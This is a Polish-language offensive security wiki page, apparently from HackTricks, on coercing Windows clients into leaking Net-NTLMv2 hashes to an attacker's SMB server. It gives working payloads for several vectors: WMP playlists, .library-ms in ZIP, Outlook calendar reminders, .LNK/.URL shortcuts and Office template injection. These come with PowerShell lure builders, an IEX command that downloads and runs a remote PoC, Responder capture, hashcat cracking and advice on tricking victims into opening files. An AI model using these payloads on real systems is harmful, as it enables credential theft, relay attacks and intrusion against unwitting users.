# Miejsca do kradzieży NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Sprawdź wszystkie świetne pomysły z [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — od pobrania pliku Microsoft Word online po źródło ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md i [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player playlists (.ASX/.WAX)

Jeśli uda ci się skłonić cel do otwarcia lub podglądu playlisty Windows Media Player, którą kontrolujesz, możesz wywołać leak Net‑NTLMv2, wskazując wpis na ścieżkę UNC. WMP spróbuje pobrać odwoływane media przez SMB i uwierzytelnianie nastąpi automatycznie.

Przykładowy payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Przepływ zbierania i cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer obsługuje pliki .library-ms w sposób niebezpieczny, gdy są otwierane bezpośrednio z archiwum ZIP. Jeśli definicja biblioteki wskazuje zdalną ścieżkę UNC (np. \\attacker\share), samo przeglądanie/uruchomienie .library-ms w ZIP powoduje, że Explorer odpyta tę ścieżkę UNC i wyśle uwierzytelnienie NTLM do atakującego. To daje NetNTLMv2, które można złamać offline lub potencjalnie relayed.

Minimalny .library-ms wskazujący na UNC atakującego
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Utwórz plik .library-ms z powyższym XML-em (ustaw swój IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) i dostarcz plik ZIP do celu.
- Uruchom NTLM capture listener i poczekaj, aż ofiara otworzy .library-ms z wnętrza ZIP-a.


### Ścieżka dźwięku przypomnienia kalendarza w Outlook (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows przetwarzał rozszerzoną właściwość MAPI PidLidReminderFileParameter w elementach kalendarza. Jeśli ta właściwość wskazuje na UNC path (e.g., \\attacker\share\alert.wav), Outlook nawiązywałby połączenie z udziałem SMB, leaking the user’s Net‑NTLMv2 bez żadnego kliknięcia. Luka została załatana 14 marca 2023 r., ale wciąż jest bardzo istotna dla środowisk legacy/niezmienionych oraz dla historycznej analizy incydentów.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Po stronie listenera:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- Ofiara musi jedynie mieć uruchomiony Outlook for Windows, gdy przypomnienie zostanie wyzwolone.
- leak daje Net‑NTLMv2 odpowiedni do offline cracking lub relay (nie pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer automatycznie renderuje ikony skrótów. Najnowsze badania pokazały, że nawet po łacie Microsoft z kwietnia 2025 dla UNC‑icon shortcuts wciąż możliwe było wywołanie uwierzytelnienia NTLM bez kliknięć przez umieszczenie celu skrótu na ścieżce UNC i pozostawienie ikony lokalnej (obejście poprawki oznaczone CVE‑2025‑50154). Sama wizyta w folderze powoduje, że Explorer pobiera metadata z zdalnego celu, wysyłając NTLM do atakującego serwera SMB.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Skrót programu (payload .lnk) przez PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Pomysły na dostarczenie
- Włóż skrót do archiwum ZIP i nakłoń ofiarę do jego przeglądania.
- Umieść skrót na zapisywalnym udziale sieciowym, który ofiara otworzy.
- Połącz z innymi lure files w tym samym folderze, aby Explorer tworzył podgląd tych elementów.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Minimalne zmiany relacji DOCX (wewnątrz word/):

1) Edytuj word/settings.xml i dodaj odwołanie do dołączonego szablonu:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edytuj word/_rels/settings.xml.rels i ustaw rId1337 na swój UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Spakuj ponownie do .docx i dostarcz. Uruchom SMB capture listener i poczekaj na otwarcie.

Po przechwyceniu — pomysły na relaying lub nadużycia NTLM, zobacz:

{{#ref}}
README.md
{{#endref}}


## Referencje
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
